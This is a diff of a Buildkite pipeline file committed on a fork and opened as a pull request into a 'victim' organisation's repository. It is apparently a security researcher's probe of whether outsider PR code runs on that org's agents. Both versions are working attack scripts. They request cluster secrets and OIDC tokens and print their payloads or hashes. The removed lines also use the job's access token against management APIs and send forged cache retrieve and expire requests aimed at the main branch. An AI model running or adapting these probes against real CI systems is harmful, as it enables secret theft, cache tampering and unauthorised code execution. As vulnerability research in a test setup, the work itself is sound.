@@ -1,64 +1,41 @@
-# File to be placed at `.buildkite/pipeline.yml` on branch `main` of the FORK
-# ali-dev-test/bk-forktest (outsider ali-dev-test is not an org member and
-# not a collaborator on ali-dev-test-2/bk-forktest). Opened as a PR into
-# ali-dev-test-2/bk-forktest:main. This is the outsider's own code: Buildkite checks out
-# and runs the PR head, so these commands run in the victim-org cluster.
+# Outsider probe: `.buildkite/pipeline.yml` on branch `main` of the FORK
+# ali-dev-test/bk-forktest, opened as PR #1 into ali-dev-test-2/bk-forktest:main.
+# ali-dev-test is NOT a member of bk-tb-victim and NOT a collaborator on the base repo.
+# If this file's commands run in the victim org's cluster, outsider code executed there.
 # `$$` is Buildkite's escape for a literal `$` at runtime.
 steps:
-  - label: ":fork: outsider fork-pr probe"
+  - label: ":fork: outsider fork-event probe"
     agents:
       queue: cp-v4
     command: |
       set +e
-      REG=forkpr-cache
-      API="https://agent.buildkite.com/v3/cache_registries/$$REG"
-      AUTH="Authorization: Token $$BUILDKITE_AGENT_ACCESS_TOKEN"
-      J='Content-Type: application/json'
-      ADDR='{"target_paths":["/tmp/fp"],"cache_key":[{"value":"fp-key","mandatory":true}]}'
-
       echo "########## identity ##########"
+      echo "OUTSIDER_PROBE_REV=[FEP-1]"
       echo "BRANCH=[$$BUILDKITE_BRANCH] PIPELINE=[$$BUILDKITE_PIPELINE_SLUG] ORG=[$$BUILDKITE_ORGANIZATION_SLUG]"
       echo "PR=[$$BUILDKITE_PULL_REQUEST] BASE=[$$BUILDKITE_PULL_REQUEST_BASE_BRANCH] PRREPO=[$$BUILDKITE_PULL_REQUEST_REPO]"
       echo "SOURCE=[$$BUILDKITE_SOURCE] REPO=[$$BUILDKITE_REPO] COMMIT=[$$BUILDKITE_COMMIT]"
-      echo "CREATOR=[$$BUILDKITE_BUILD_CREATOR] CREATOR_EMAIL=[$$BUILDKITE_BUILD_CREATOR_EMAIL]"
+      echo "GH_EVENT=[$$BUILDKITE_GITHUB_EVENT] GH_ACTION=[$$BUILDKITE_GITHUB_ACTION]"
+      echo "CREATOR=[$$BUILDKITE_BUILD_CREATOR] AUTHOR=[$$BUILDKITE_BUILD_AUTHOR]"
       echo "HEAD=[$$(git rev-parse HEAD 2>/dev/null || echo NOCHECKOUT)]"
-      echo "HEADFILE=[$$(head -c 60 .buildkite/pipeline.yml 2>/dev/null | tr '\n' ' ')]"
+      echo "HEADFILE=[$$(head -c 40 .buildkite/pipeline.yml 2>/dev/null | tr '\n' ' ')]"
+      echo "JOBTOKENLEN=[$${#BUILDKITE_AGENT_ACCESS_TOKEN}]"
 
-      echo "########## secret FORKVALUE (policy: pipeline fork-pr + branch main) ##########"
-      if V=$$(buildkite-agent secret get FORKVALUE 2>/dev/null); then
-        echo "SECRET_OK $$(printf %s "$$V" | sha256sum | cut -c1-16)"
+      echo "########## secrets ##########"
+      if V=$$(buildkite-agent secret get FORKEVT 2>/dev/null); then
+        echo "FORKEVT_SECRET_OK $$(printf %s "$$V" | sha256sum | cut -c1-16)"
       else
-        echo "SECRET_DENIED"
+        echo "FORKEVT_SECRET_DENIED"
+      fi
+      if V=$$(buildkite-agent secret get FORKEVTMAIN 2>/dev/null); then
+        echo "FORKEVTMAIN_SECRET_OK $$(printf %s "$$V" | sha256sum | cut -c1-16)"
+      else
+        echo "FORKEVTMAIN_SECRET_DENIED"
       fi
 
       echo "########## OIDC ##########"
-      T=$$(buildkite-agent oidc request-token --audience forkpr-oidc --lifetime 120 2>/dev/null)
+      T=$$(buildkite-agent oidc request-token --audience forkevt-oidc --lifetime 120 2>/dev/null)
       if [ -n "$$T" ]; then echo "OIDC_PAYLOAD $$(printf %s "$$T" | cut -d. -f2)"; else echo "OIDC none"; fi
 
-      echo "########## management API reach from the job token ##########"
-      for U in "https://api.buildkite.com/v2/organizations/bk-tb-victim" "https://api.buildkite.com/v2/organizations/bk-tb-victim/clusters/3737b024-f097-4c86-8e3e-9c6be55aa772/secrets" "https://api.buildkite.com/v2/organizations/bk-tb-victim/pipelines/fork-pr"; do
-        echo "API $$U -> $$(curl -sS -o /dev/null -w '%{http_code}' -H "$$AUTH" "$$U")"
-      done
-
-      echo "########## cache: registry detail ##########"
-      curl -sS -H "$$AUTH" "$$API"; echo
-
-      echo "########## cache: own retrieve (server-resolved scope candidates) ##########"
-      curl -sS -X POST -H "$$AUTH" -H "$$J" -d "$$ADDR" "$$API/retrieve"; echo
-
-      echo "########## cache: forged retrieve scopes {branch: main} (control: must not return main) ##########"
-      curl -sS -X POST -H "$$AUTH" -H "$$J" -d '{"target_paths":["/tmp/fp"],"cache_key":[{"value":"fp-key","mandatory":true}],"scopes":{"branch":"main"}}' "$$API/retrieve"; echo
-
-      echo "########## cache: peek ##########"
-      curl -sS -X POST -H "$$AUTH" -H "$$J" -d "$$ADDR" "$$API/peek"; echo
-
-      echo "########## cache: control expire with this job's own resolved scope ##########"
-      curl -sS -X POST -H "$$AUTH" -H "$$J" -d "{\"target_paths\":[\"/tmp/fp\"],\"cache_key\":[{\"value\":\"fp-key\",\"mandatory\":true}],\"scopes\":{\"branch\":\"$$BUILDKITE_BRANCH\"}}" "$$API/expire"; echo
-
-      echo "########## cache: FORGED expire scopes {branch: main} ##########"
-      curl -sS -X POST -H "$$AUTH" -H "$$J" -d '{"target_paths":["/tmp/fp"],"cache_key":[{"value":"fp-key","mandatory":true}],"scopes":{"branch":"main"}}' "$$API/expire"; echo
-
-      echo "########## cache: forged expire again (idempotence / existence oracle) ##########"
-      curl -sS -X POST -H "$$AUTH" -H "$$J" -d '{"target_paths":["/tmp/fp"],"cache_key":[{"value":"fp-key","mandatory":true}],"scopes":{"branch":"main"}}' "$$API/expire"; echo
-
+      echo "########## marker ##########"
+      echo "OUTSIDER_CODE_EXECUTED_ON_VICTIM_AGENT [$$(hostname)]"
       echo "########## done ##########"
